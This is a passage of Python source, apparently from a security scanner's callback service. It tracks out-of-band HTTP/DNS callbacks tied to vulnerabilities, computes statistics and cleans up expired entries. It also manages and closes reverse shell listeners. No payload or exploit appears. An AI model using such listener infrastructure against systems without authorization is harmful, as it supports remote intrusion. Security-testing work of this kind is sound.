                            await self._close_shell_listener(callback.callback_id)
                            del self.callback_ports[callback.callback_id]
                    
                    db.commit()
                    
                    if expired_callbacks:
                        self.logger.info(f"Cleaned up {len(expired_callbacks)} expired callbacks")
                
            except Exception as e:
                self.logger.error(f"Callback cleanup error: {e}")
    
    async def _close_shell_listener(self, callback_id: str):
        """Close reverse shell listener"""
        try:
            if callback_id in self.shell_handler.shell_servers:
                server_info = self.shell_handler.shell_servers[callback_id]
                server = server_info['server']
                server.close()
                await server.wait_closed()
                del self.shell_handler.shell_servers[callback_id]
                
                self.logger.info(f"Closed shell listener for callback {callback_id}")
        except Exception as e:
            self.logger.error(f"Error closing shell listener: {e}")
    
    async def get_callback_status(self, callback_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific callback"""
        with get_db_session() as db:
            callback = db.query(Callback).filter(
                Callback.callback_id == callback_id
            ).first()
            
            if not callback:
                return None
            
            return {
                'callback_id': callback.callback_id,
                'callback_type': callback.callback_type.value,
                'status': callback.status.value,
                'created_at': callback.created_at.isoformat(),
                'expires_at': callback.expires_at.isoformat(),
                'received_at': callback.received_at.isoformat() if callback.received_at else None,
                'source_ip': callback.source_ip,
                'confidence_score': callback.confidence_score,
                'vulnerability_id': str(callback.vulnerability_id) if callback.vulnerability_id else None,
                'evidence': callback.evidence,
                'metadata': callback.metadata
            }
    
    async def get_active_callbacks(self, vulnerability_id: Optional[str] = None,
                                 scan_session_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Get list of active callbacks"""
        with get_db_session() as db:
            query = db.query(Callback).filter(
                Callback.status.in_([CallbackStatus.PENDING, CallbackStatus.RECEIVED, CallbackStatus.PROCESSED]),
                Callback.expires_at > datetime.utcnow()
            )
            
            if vulnerability_id:
                query = query.filter(Callback.vulnerability_id == vulnerability_id)
            
            if scan_session_id:
                query = query.filter(Callback.scan_session_id == scan_session_id)
            
            callbacks = query.order_by(Callback.created_at.desc()).all()
            
            return [
                {
                    'callback_id': cb.callback_id,
                    'callback_type': cb.callback_type.value,
                    'status': cb.status.value,
                    'created_at': cb.created_at.isoformat(),
                    'received_at': cb.received_at.isoformat() if cb.received_at else None,
                    'source_ip': cb.source_ip,
                    'confidence_score': cb.confidence_score,
                    'vulnerability_id': str(cb.vulnerability_id) if cb.vulnerability_id else None
                }
                for cb in callbacks
            ]
    
    async def get_callback_statistics(self, timeframe_days: int = 30) -> Dict[str, Any]:
        """Get callback statistics"""
        with get_db_session() as db:
            cutoff_date = datetime.utcnow() - timedelta(days=timeframe_days)
            
            callbacks = db.query(Callback).filter(
                Callback.created_at >= cutoff_date
            ).all()
            
            # Calculate statistics
            total_callbacks = len(callbacks)
            received_callbacks = len([cb for cb in callbacks if cb.status == CallbackStatus.RECEIVED or cb.status == CallbackStatus.PROCESSED])
            
            # Statistics by type
            type_stats = {}
            for callback_type in CallbackType:
                type_callbacks = [cb for cb in callbacks if cb.callback_type == callback_type]
                type_received = [cb for cb in type_callbacks if cb.status in [CallbackStatus.RECEIVED, CallbackStatus.PROCESSED]]
                
                type_stats[callback_type.value] = {
                    'total': len(type_callbacks),
                    'received': len(type_received),
                    'success_rate': len(type_received) / len(type_callbacks) if type_callbacks else 0
                }
            
            # Average confidence score
            received_with_confidence = [cb for cb in callbacks if cb.confidence_score > 0]
            avg_confidence = sum(cb.confidence_score for cb in received_with_confidence) / len(received_with_confidence) if received_with_confidence else 0
            
            return {
                'timeframe_days': timeframe_days,
                'total_callbacks': total_callbacks,
                'received_callbacks': received_callbacks,
                'success_rate': received_callbacks / total_callbacks if total_callbacks > 0 else 0,
                'average_confidence': avg_confidence,
                'by_type': type_stats,
                'active_callbacks': len(self.active_callbacks),
                'server_status': {
                    'http_port': self.http_port,
                    'dns_port': self.dns_port,
                    'base_domain': self.base_domain,
                    'shell_listeners': len(self.shell_handler.shell_servers)
                }
            }
    
    async def delete_callback(self, callback_id: str) -> bool:
        """Delete a callback and clean up resources"""
        try:
            with get_db_session() as db:
                callback = db.query(Callback).filter(
                    Callback.callback_id == callback_id
                ).first()
                
                if not callback:
                    return False
                
                # Clean up resources
                if callback_id in self.active_callbacks:
                    del self.active_callbacks[callback_id]
                
                if callback_id in self.callback_ports:
                    await self._close_shell_listener(callback_id)
                    del self.callback_ports[callback_id]
                
                # Delete from database
                db.delete(callback)
                db.commit()
                
                return True
                
        except Exception as e:
            self.logger.error(f"Callback deletion error: {e}")
            return False


# Shared callback service instance
callback_service = CallbackService()
